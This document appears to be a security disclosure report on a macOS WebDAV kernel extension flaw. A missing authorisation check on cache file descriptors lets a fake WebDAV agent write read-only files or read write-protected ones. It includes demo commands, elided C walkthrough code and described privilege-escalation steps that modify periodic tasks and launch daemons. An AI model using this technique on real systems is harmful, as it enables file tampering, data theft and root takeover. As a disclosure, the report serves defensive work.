# Title

Lack of validation in WebDAV kernel extension when handling sysctl requests for associating cache files may allow a malicious application to bypass read only or write only restriction enforced on a file by file system

# Summary

WebDAV (Web-based Distributed Authoring and Versioning) protocol allows users to collaboratively edit and manage files on remote web servers [[ref]](http://www.webdav.org). MacOS can connect to WebDAV servers and mount the files shared on the server as a disk / volume [[ref]](https://support.apple.com/en-in/guide/mac-help/mchlp1546/mac). This functionality is mainly provided by WebDAV kernel extension (kext) and WebDAV agent (a process running in userland). 

When a file in WebDAV mount is opened, a cache file is associated to that file. This cache file is created by the agent process. Agent process calls `sysctl` syscall with file descriptor of opened cache file to associate a cache file with a file in WebDAV mount. The `sysctl` syscall is handled by function `webdav_sysctl` implemented [here](https://todo) in kext. The current implementation directly associates the `vnode` pointer of received file descriptor to the file in WebDAV mount, without validating whether the received file descriptor of cache file is authorized for read and write operation. When writing data to a file in WebDAV mount, the data is first written to cache file by kext. The data is then read by agent and send to WebDAV server.

This lack of validation can be exploited by a malicious application to bypass read only or write only restriction enforced on a file by file system by making the WebDAV kext to do the task for it. For example to bypass read only restriction on `protected.txt` file, the malicious application will create a fake WebDAV agent. The fake agent will then create a WebDAV mount by calling `mount` syscall with appropriate arguments. The arguments will include the address of socket to which the kext should connect to. In this case the kext will be connecting to unix domain socket served by the fake agent. Lets say the fake agent creates the mount at `/Volumes/localhost`. The fake agent will then craft responses to kext is such a way that the target file `protected.txt` will be associated as cache file of a file inside mount, lets say`/Volumes/localhost/portal`. Kext will write the data written to `/Volumes/localhost/portal` to the associated cache file `protected.txt`.  Now the malicious application can write to the unrestricted file `/Volumes/localhost/portal` to write data to read only restricted `protected.txt`, bypassing file system permission restrictions.

# Exploitability

For this exploit to work, the fake WebDAV agent should be able to open file descriptor to target file by executing `open` syscall. This introduces certain limitations

##### To write data to target file

1. Target file should exist

2. Running user shoud have read permission to target file

3. Target file should not be protected by System Integrity Protection (SIP)

##### To read data from target file

1. Running user should have write permission to target file

**Note:** Except SIP, other limitations can be circumvented by acquiring root priveleges. See POC #1 and #2 for acquiring root privilege using this exploit

# Impact

1. This exploit can be used to achieve privilege escalation and run commands in root user context. See demo [#1](#replacing-periodic-tasks) and [#2](#replacing-periodic-tasks)

2. Malicious actors like ransomware may exploit this vulnerability to tamper read only files without running as root - See [demo](#overwrite-read-only-file)

3. Malicious application can access confidential data from read protected files without running as root - See [demo](#read-write-only-file)

4. Theoretically possible to do code execution in kernel context by replacing current version of a kernel extension with old vulnerable version which is not blacklisted in `AppleKextExcludeList.kext`

# Demo

##### Overwrite read only file

The following steps will demonstrate writing on a protected file `secure.txt` by an unauthorized user

1. Create a file named `secure.txt` with content `Do not tamper`
   
   ```bash
   touch ~/secure.txt
   echo 'Do not tamper' > ~/secure.txt
   ```

2. Set the owner of `secure.txt` to *root*. Set the file permission such that only root has write permission. Others users can only read the file
   
   ```bash
   sudo chown root ~/secure.txt
   sudo chmod 644 ~/secure.txt
   ```

3. Verify current user cannot write to `secure.txt`
   
   ```bash
   touch ~/secure.txt
   ```
   
   Running above command will fail with error `Permission denied`

4. Create a file named `payload.txt` in home directory with content `Tampered!`
   
   ```bash
   touch ~/payload.txt
   echo 'Tampered!' > ~/payload.txt
   ```

5. Overwrite contents of `secure.txt` with contents of `payload.txt` by running portal. Assuming you downloaded `portal` executable from mail attachment to current directory
   
   ```bash
   ./portal write ~/secure.txt ~/payload.txt
   ```

6. Verify
   
   ```bash
   cat ~/secure.txt
   ```
   
   Running above command will output `Tampered!`

##### Acquiring root privelege

Scripts used below are available at `poc` directory.

###### Replacing periodic tasks

1. Deploy payload `exploit_periodic_payload` by running
   
   ```bash
   bash ./exploit_periodic.sh
   ```
   
   Note: This script will replace `/etc/periodic/daily/110.clean-tmps` with modified `exploit_periodic_payload` file which will execute command `echo "executing as $EUID" > /tmp/exploit_periodic.txt` when daily periodic tasks are run

2. Daily periodic tasks are run at predefined schedule. To trigger them immediatly for demo, run
   
   ```bash
   sudo periodic daily
   ```
   
   This will create `/tmp/exploit_periodic.txt` containing text`executing as 0` showing that the modified payload was run as root.

3. To restore original `/etc/periodic/daily/110.clean-tmps` run
   
   ```bash
   bash ./restore_periodic.sh
   ```

###### Replacing launch daemon plist

1. For this exploit to work, atleast one launch daemon plist must be present in `/Library/LaunchDaemons` directory.  Run `exploit_launchd.sh`
   
   ```bash
   bash ./exploit_launchd.sh
   ```
   
   **Note:** `exploit_launchd.sh` script will modify a launch daemon plist to run command`sh -c "echo $EUID > /tmp/exploit_launchd.txt"`

2. Restart system to run the modified launch daemon plist.  File `/tmp/exploit_launchd.txt` will be created with content `0` 

3. To restore original launch daemon plist, run
   
   ```bash
   bash ./restore_launchd.sh
   ```

##### Read write only file

1. Create a file named `secure_log.txt` in `HOME` directory
   
   ```bash
   touch ~/secure_log.txt
   ```

2. Make it read protected
   
   ```bash
   sudo chown root:wheel ~/secure_log.txt
   sudo chmod 622 ~/secure_log.txt
   ```

3. Add some data to log
   
   ```bash
   echo 'confidential' >> ~/secure_log.txt
   ```

4. Verify user cannot read `secure_log.txt`
   
   ```bash
   cat ~/secure_log.txt
   ```
   
   Above command will fail with `Permission denied`

5. Use portal to read data from `secure_log.txt` to `capture.txt`
   
   ```bash
   ./portal read ~/secure_log.txt ~/capture.txt
   ```

6. Verify if read succeded
   
   ```bash
   cat ~/capture.txt
   ```
   
   Above command will output `confidential`

# Working

The following example explains how a malicious app can exploit the before mentioned vulnerability to overwrite a read only file, lets say `/etc/zprofile`. 

1. Malicious app start a fake WebDAV agent. Fake agent creates and listen on a unix domain socket, at say `/tmp/.portal/socket`

2. Malicious app then calls `mount` syscall which can be executed in standard user context to mount WebDAV FS.
   
   ```c
   /* Opaque ID of mount root directory */
   #define ROOT_DIR_ID CreateOpaqueID(1, 1)
   /* Inode of mount root directory */
   #define ROOT_DIR_INO WEBDAV_ROOTFILEID
   
   struct sockaddr_un un;
   bzero(&un, sizeof(un));
   strlcpy(un.sun_path, "/tmp/.portal/socket", sizeof(un.sun_path));
   /* set other sockaddr_un fields */
   ...
   
   struct webdav_args args;
   bzero(&args, sizeof(args));
   
   args.pa_socket_name = (struct sockaddr *)un;
   args.pa_root_id = ROOT_DIR_ID;
   args.pa_root_fileid = ROOT_DIR_INO;
   /* other arguments */
   ...  
   
   mount("webdav", "/tmp/.portal/mount", MNT_ASYNC | MNT_LOCAL | MNT_UNION, &args);
   ```

3. Malicious app then opens `/tmp/.portal/mount/portal` file inside WebDAV FS for writing by making `open` syscall. 
   
   1. The kernel will first lookup for file with name `portal` inside root directory by calling `webdav_vnop_lookup` of WebDAV kext implemented at [webdav_vnops.c](). The kext will send following request to fake agent to complete lookup
      
      ```c
      struct webdav_request_lookup request;
      /* Opaque id of root directory */
      request.dir_id = ROOT_DIR_ID;
      request.name = "portal";
      request.name_length = strlen("portal");
      /* Set other fields */
      ...
      
      /* send request to agent */
      ```
   
   2. Fake agent will respond to request with
      
      ```c
      struct webdav_reply_lookup reply
      
      /* opaque id of portal file */
      reply.obj_id = PORTAL_FILE_ID;
      /* inode of portal file */
      reply.obj_fileid = PORTAL_FILE_INO;
      /* set portal node type as FILE */
      reply.obj_type = WEBDAV_FILE_TYPE;
      
      /* size of target file */
      reply.obj_filesize = stat.st_size;
      /* set other fields to stat of target file */
      ...
      ```
      
      WebDAV kext will use this response to send lookup response to kernel
   
   3. The kernel will then open the `portal` file by calling `webdav_vnop_open` of WebDAV kext implemented at [webdav_vnops.c](). WebDAV kext will send `open` request to WebDAV agent with following data
      
      ```c
      struct webdav_request_open request;
      /* opaque id of portal file */
      request.obj_id = PORTAL_FILE_ID;
      
      struct open_associatecachefile associatecachefile;
      associatecachefile.pid = 0;
      associatecachefile.cachevp = NULLVP;
      
      /* Store the pointer to associatecachefile in webdav_ref_table */
      /* and save the index at which it was stored in request.ref */
      /* Later on pointer to associatecachefile can be obtained */
      /* if ref is known */
      webdav_assign_ref(&associatecachefile, &request.ref);
      
      /* set other fields and send request to agent  */
      ...
      ```
   
   4. To serve `open` request, WebDAV agent first associate a cache file to the file in WebDAV mount. The fake WebDAV agent created by malicious app will associate the target file as cache of `portal` file by making following `sysctl` syscall.
      
      ```c
      /* open target file in read-only mode to get file descriptor */
      int target_fd = open('/etc/zprofile', O_RDONLY);
      
      int mib[5];
      
      /* setup mib for the request */
      mib[0] = CTL_VFS;
      mib[1] = g_vfc_typenum;
      mib[2] = WEBDAV_ASSOCIATECACHEFILE_SYSCTL;
      /* index in webdav_ref_table where pointer to associatecachefile  is saved*/
      /* obtained from kext request webdav_request_open */
      mib[3] = request.ref;
      /* file descriptor to target file */
      mib[4] = target_fd;
      
      sysctl(mib, 5, NULL, NULL, NULL, 0)
      ```
   
   5. Kernel upon receiving this `sysctl` syscall will use `mib[0]` and `mib[1]` to route the request to `webdav_sysctl` function implemented in [webdav_vfsops.c]()
      
      ```c
      static int webdav_sysctl(int *name, u_int namelen, user_addr_t oldp, size_t *oldlenp, user_addr_t newp, size_t newlen, vfs_context_t context)
      {
       switch (name[0])
       {
         case WEBDAV_ASSOCIATECACHEFILE_SYSCTL:
           {
            int ref;
            int fd;
            struct open_associatecachefile *associatecachefile;
            vnode_t vp;
      
            ref = name[1];
            fd = name[2];
      
            /* Use ref to get reference to associatecachefile */
            webdav_translate_ref(ref, &associatecachefile);
      
            /* Obtain the reference to vnode of file descriptor fd */
            /* from the calling process */
            file_vnode_withvid(fd, &vp, NULL);
      
            /* store the cache file's vnode in the webdavnode */
            associatecachefile->cachevp = vp;
      
            /* store the PID of the process that called us */
            /* for validation in webdav_open */
            associatecachefile->pid = vfs_context_pid(context);
            ...
          }
        ...
        }
      }
      ```
      
      Since there is no validation to make sure that the file descriptor of cache file, `fd` is authorized for read and write, sending the read only file descriptor to target file will be accepted.
   
   6. The WebDAV agent then sends response to kext with following data
      
      ```c
      struct webdav_reply_open reply;
      reply.pid = getpid();
      
      /* send reply to kext */
      ```
   
   7. The kext will then associate the reference to `vnode` of received file descriptor which is the reference to `vnode` of target file as cache file of `portal` file
      
      ```c
      vnode_t vp;
      vp = ap->a_vp;
      pt = VTOWEBDAV(vp);
      
      struct webdav_request_open request;
      /* opaque id of portal file */
      request.obj_id = PORTAL_FILE_ID;
      struct open_associatecachefile associatecachefile;
      associatecachefile.pid = 0;
      associatecachefile.cachevp = NULLVP;
      /* Store the pointer to associatecachefile in webdav_ref_table */
      /* and save the index at which it was stored in request.ref */
      /* Later on pointer to associatecachefile can be obtained */
      /* if ref is known */
      webdav_assign_ref(&associatecachefile, &request.ref);
      
      /* request sending and other instructions */
      ...
      
      /* Make sure the cache file was associated by correct agent */
      if (reply_open.pid != associatecachefile.pid)
      {
        error = EPERM;
        goto dealloc_done;
      }
      
      /* Associates target file vode as cache file of portal */
      pt->pt_cache_vnode = associatecachefile.cachevp;
      
      ...
      ```

4. Now the malicious app have file descriptor to `portal` file with read and write capability. When the malicious app writes data to `portal` file, the kernel will call the `webdav_vnop_write` function in WebDAV kext implemented in [webdav_nvops.c]()
   
   ```c
   static int webdav_vnop_write(struct vnop_write_args *ap)
   {
    struct webdavnode *pt;
    pt = VTOWEBDAV(ap->a_vp);
    vp = ap->a_vp;
    ...
    cachevp = pt->pt_cache_vnode;
    in_uio = ap->a_uio;
   
    /* Write data to cache file first */
    VNOP_WRITE(cachevp, in_uio, 0, ap->a_context);
    VATTR_INIT(&vattr);
    VATTR_SET(&vattr, va_data_size, uio_offset(in_uio));
   
    /* Update size of cache file */
    vnode_setattr(cachevp, &vattr, ap->a_context);
   
    // send request to agent containing data size and offset
    // fake agent will simple respond success to this request
    ...
   }
   ```
   
   The WebDAV kext will first write the data to cache file by `VNOP_WRITE` function with pointer to `vnode` of target file. This will write the data to target file even thought the malicious app did not have write access to target file

# References

1. [WebDAV.org](http://www.webdav.org)
